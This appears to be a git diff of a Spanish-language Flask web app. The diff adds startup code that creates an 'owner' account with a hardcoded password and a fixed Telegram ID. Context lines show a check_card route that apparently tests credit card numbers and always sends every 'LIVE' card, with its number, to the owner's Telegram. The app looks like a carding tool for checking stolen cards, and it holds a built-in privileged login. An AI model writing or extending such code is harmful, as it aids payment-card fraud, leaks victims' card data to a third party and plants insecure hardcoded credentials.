@@ -25,7 +25,6 @@ class User(db.Model):
     telegram_id = db.Column(db.String(20), nullable=True)
     role = db.Column(db.String(10), default='user')
 
-
     def set_password(self, password):
         self.password_hash = generate_password_hash(password)
     def check_password(self, password):
@@ -37,7 +36,30 @@ class Key(db.Model):
     used = db.Column(db.Boolean, default=False)
     expires_at = db.Column(db.DateTime, nullable=True)
 
+# Inicializar owner y owner_key si no existen
+def init_owner_and_key():
+    owner = User.query.filter_by(username='owner').first()
+    if not owner:
+        owner = User(
+            username='owner',
+            telegram_id='846983753',
+            role='owner'
+        )
+        owner.set_password('Saiper123')
+        db.session.add(owner)
+        print("Usuario owner creado.")
 
+    owner_key = Key.query.filter_by(key='owner_key').first()
+    if not owner_key:
+        owner_key = Key(
+            key='owner_key',
+            used=True,
+            expires_at=None
+        )
+        db.session.add(owner_key)
+        print("Key owner_key creada.")
+
+    db.session.commit()
 
 # RUTAS
 @app.route('/')
@@ -81,24 +103,19 @@ def register():
 
 @app.route('/login', methods=['POST'])
 def login():
-    username = request.form['username'].strip()
+    username = request.form['username']
     password = request.form['password']
     user = User.query.filter_by(username=username).first()
-    if user and user.check_password(password):
+    if user and check_password_hash(user.password_hash, password):
         session['user_id'] = user.id
-        session['username'] = user.username
-        session['role'] = user.role
-        flash('Has iniciado sesión con éxito.', 'success')
         return redirect(url_for('dashboard'))
-    else:
-        flash('Usuario o contraseña incorrectos.', 'error')
-        return redirect(url_for('index'))
+    return 'Usuario o contraseña incorrectos'
 
 @app.route('/dashboard')
 def dashboard():
     if 'user_id' not in session:
         return redirect(url_for('index'))
-    
+
     user = db.session.get(User, session['user_id'])
     if not user:
         session.clear()
@@ -222,7 +239,6 @@ def check_card():
             telegram_ids.add('846983753')  # Siempre agrega al Owner
             enviar_telegram(f"✅ *LIVE* - {result['cc']}\n{result['message']}", list(telegram_ids))
 
-
         return jsonify(result)
     except Exception as e:
         return jsonify({'status': 'error', 'message': str(e)}), 500
@@ -232,11 +248,8 @@ def ping():
     return jsonify({'message': 'pong'})
 
 if __name__ == '__main__':
+    with app.app_context():
+        db.create_all()  # Crea tablas si no existen
+        init_owner_and_key()  # Inicializa owner y owner_key si no existen
     port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port)
-
-
-
-
-
-
